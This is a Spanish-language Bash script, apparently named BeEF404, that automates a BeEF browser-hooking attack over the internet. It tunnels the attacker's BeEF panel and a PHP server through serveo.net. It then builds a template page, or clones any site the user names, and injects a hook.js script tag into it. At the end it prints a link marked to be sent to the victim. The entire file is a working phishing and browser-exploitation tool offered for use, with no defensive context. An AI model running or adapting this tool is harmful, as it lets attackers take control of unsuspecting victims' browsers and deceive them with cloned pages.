#!/usr/bin/env bash

#colores
rojo='\e[0;31m'
neutro='\e[0m'
azulclaro='\e[1;34m'
verdeclaro='\e[1;32m'
cyanclaro='\e[1;36m'
rojoclaro='\e[1;31m'
purpuraclaro='\e[1;35m'
amarillo='\e[1;33m'
gris='\e[0;37m'
cafe='\e[0;33m'

    echo -e "$amarillo          ===========================$neutro"
    sleep 1
    echo -e "$cyanclaro           Verificando Dependencias  $neutro"
    sleep 2
    echo -e "$amarillo          ===========================$neutro"
    sleep 1
    echo
#verificando PHP
which php > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $verdeclaro "[ ✔ ]   PHP..............$purpuraclaro[ Instalado ]$neutro"
which php > /dev/null 2>&1
sleep 3
else
echo -e $rojoclaro "[ X ] PHP  -> $rojo No instaldo "
echo -e $amarillo "[ ! ] Instalando PHP "
sudo apt-get install php -y
echo -e $azulclaro "[ ✔ ] Termino la Instalacion ...."
which php > /dev/null 2>&1
sleep 3
fi

#verificando SSH
which ssh > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $verdeclaro "[ ✔ ]   SHH..............$purpuraclaro[ Instalado ]$neutro"
which ssh > /dev/null 2>&1
sleep 2
else
echo -e $rojoclaro "[ X ] PHP  -> $rojo No instaldo "
echo -e $amarillo "[ ! ] Instalando SHH "
sudo apt-get install ssh -y
echo -e $azulclaro "[ ✔ ] Termino la Instalacion ...."
which php > /dev/null 2>&1
sleep 2
fi

#loop
count(){
  spin &
  pid=$!
  for i in `seq 1 5`
  do
    sleep 0.26;
  done
  kill $pid
  echo  
}
 
spin(){
  while [ 1 ]
  do
       echo -ne "=";
     sleep 0.02;
  done
}
#banner del grupo 
banner(){
echo ""
printf "$verdeclaro ██████╗ ███████╗███████╗███████╗██╗  ██╗ ██████╗ ██╗  ██╗
 ██╔══██╗██╔════╝██╔════╝██╔════╝██║  ██║██╔═████╗██║  ██║
 ██████╔╝█████╗  █████╗  █████╗  ███████║██║██╔██║███████║
 ██╔══██╗██╔══╝  ██╔══╝  ██╔══╝  ╚════██║████╔╝██║╚════██║
 ██████╔╝███████╗███████╗██║          ██║╚██████╔╝     ██║
 ╚═════╝ ╚══════╝╚══════╝╚═╝          ╚═╝ ╚═════╝      ╚═╝$neutro
                                     $azulclaro BY JAVIC $rojoclaro ERROR 404$amarillo\n"
} 
                     
#abrir puertos con serveo
server() {
count
echo -e "$verdeclaro Para continuar debes iniciar los servicios de Beef-Xss$neutro"
echo -e "$verdeclaro Abre otra terminal e inicia Beef luego presiona enter$rojoclaro"
read -p " Preciona la tecla enter y continua: "
count
echo -e "$rojoclaro [$cyanclaro*$rojoclaro]$cyanclaro Abriendo puertos...$amarillo"
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 443:localhost:3000 serveo.net 2> /dev/null > sendattac \n' &
sleep 6
send_link1=$(grep -o "[0-9a-z]*\.serveo.net" sendattac)
sleep 2
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:80 serveo.net 2> /dev/null > sendvictim \n' &
sleep 6
send_link=$(grep -o "[0-9a-z]*\.serveo.net" sendvictim)
sleep 2
count
echo -e "$rojoclaro [$cyanclaro*$rojoclaro]$cyanclaro Iniciando servidor...$amarillo"
php -S localhost:80 > /dev/null 2>&1 &
sleep 10
}

#contro c para detener el script
trap ctrl_c INT
ctrl_c() {
printf "\n"
echo -e "$amarillo"
count
echo -e $rojoclaro" Presiono (Ctrl + C ) saliendo del Script.. "
echo -e $rojoclaro"         Deteniendo servicios... "
count
stop
sleep 1
exit 1
}

#detener los procesos
stop() {
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
if [[ $checkruby == *'ruby'* ]]; then
killall -2 ruby > /dev/null 2>&1
fi
clear
banner
count
echo -e "$rojoclaro [$cyanclaro*$rojoclaro]$purpuraclaro Deteniendo Los procesos...$amarillo"
count
rm -rf index.html
rm -rf hook.js
rm -rf sendvictim
rm -rf sendattac
sleep 2
clear
exit 1
}

#Incrustar el hook
index(){
count
echo -e "$rojoclaro [$cyanclaro*$rojoclaro]$cyanclaro Modificando archivos $amarillo"
sleep 2
sed "s|NaM1|$send_link|g" beef.html > index.html
sed "s|NaM2|$send_link1|g" base.js > hook.js

}
#links panel y vicitma
links(){

count
echo -e "$rojoclaro [$cyanclaro*$rojoclaro]$cyanclaro Abre el navegador para acceder al panel de Beef$neutro"
sleep 2
echo -e "$rojoclaro [$cyanclaro*$rojoclaro]$purpuraclaro http://$send_link1/ui/panel $amarillo "
count
echo -e "$rojoclaro [$cyanclaro*$rojoclaro]$cyanclaro Envia este link a la victima$neutro "
echo -e "$rojoclaro [$cyanclaro*$rojoclaro]$purpuraclaro http://$send_link $amarillo"
sleep 2
count
}

#clonador de paginas
function nombre_index(){
 count
 echo -e "$rojoclaro [$cyanclaro*$rojoclaro]$cyanclaro Ingresa la direccion web que quieres clonar $neutro"
 read -p " Clone >> " clone
 echo -e "$rojoclaro [$cyanclaro*$rojoclaro]$cyanclaro Clonando Pagina ... $neutro"
 count
 wget $clone --no-check-certificate -O pagecln.html -c -k -U "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0" > /dev/null 2>&1

}

#modicador de pagina clonada
function lanzador()
{
 echo -e "$rojoclaro [$cyanclaro*$rojoclaro]$cyanclaro Modificando los archivos... $neutro"
 echo '<script src="http://local-ip:80/hook.js"></script></body>' | sed "s|local-ip|$send_link|" >> indexmod
 com=`cat indexmod`
 rep="</body>"
 sed "s|$rep|$com|" pagecln.html > index2.html
 sed "s|NaM2|$send_link1|g" base.js > hook.js
 mv index2.html index.html  
 rm indexmod > /dev/null 2>&1
 rm pagecln.html > /dev/null 2>&1
 rm sendvictim > /dev/null 2>&1
 rm sendattac > /dev/null 2>&1
 
}

#menu del script
menu(){
while :
    do
    clear
    banner
    echo -e "$amarillo ==============================================================$neutro"
    echo -e "$cyanclaro Este Script automatiza el ataque de beef fuera de la red local $neutro"
    echo -e "$amarillo ==============================================================$neutro"
    echo -e ""
    echo -e "$rojoclaro [$cyanclaro 1 $rojoclaro]$cyanclaro Plantilla $neutro"
    echo -e "$rojoclaro [$cyanclaro 2 $rojoclaro]$cyanclaro Clona una pagina $neutro"
    echo -e "$rojoclaro [$cyanclaro 99 $rojoclaro]$cyanclaro Salir $neutro"
    echo ""
    read -p $' \e[1;31m[\e[0m\e[1;36m*\e[0m\e[1;31m]\e[1;33m Escoje una opcion?: ' option
    if [[ $option == 1 || $option == 01 ]]; then
    echo ""
    clear
    banner
    server
    index
    links
        while :
          do
         echo -e "$rojoclaro [$cyanclaro 99 $rojoclaro]$cyanclaro Salir $neutro"
         echo ""
        read -p $' \e[1;31m[\e[0m\e[1;36m*\e[0m\e[1;31m]\e[1;33m Presiona 99 para salir: ' opt
        if [[ $opt == 99 ]]; then
        clear
        stop
        exit 1
        else
        echo -e  "$rojoclaro [$cyanclaro*$rojoclaro]$cyanclaro opcion no valida! $neutro"
        sleep 1
         clear
         banner
        fi
       done
    sleep 10
    elif [[ $option == 2 || $option == 02 ]]; then
    clear
    banner
    server
    nombre_index
    lanzador
    links
         echo -e "$rojoclaro [$cyanclaro 99 $rojoclaro]$cyanclaro Salir $neutro"
         echo ""
        read -p $' \e[1;31m[\e[0m\e[1;36m*\e[0m\e[1;31m]\e[1;33m Presiona 99 para salir: ' opt
        if [[ $opt == 99 ]]; then
        clear
        stop
        exit 1
        else
        echo -e  "$rojoclaro [$cyanclaro*$rojoclaro]$cyanclaro opcion no valida! $neutro"
        sleep 1
         clear
         banner
        fi
    elif [[ $option == 99 ]]; then
    stop
    exit 1
    else
    echo -e  "$rojoclaro [$cyanclaro*$rojoclaro]$cyanclaro opcion no valida! $neutro"
    sleep 1
    clear
   fi
done
}
menu

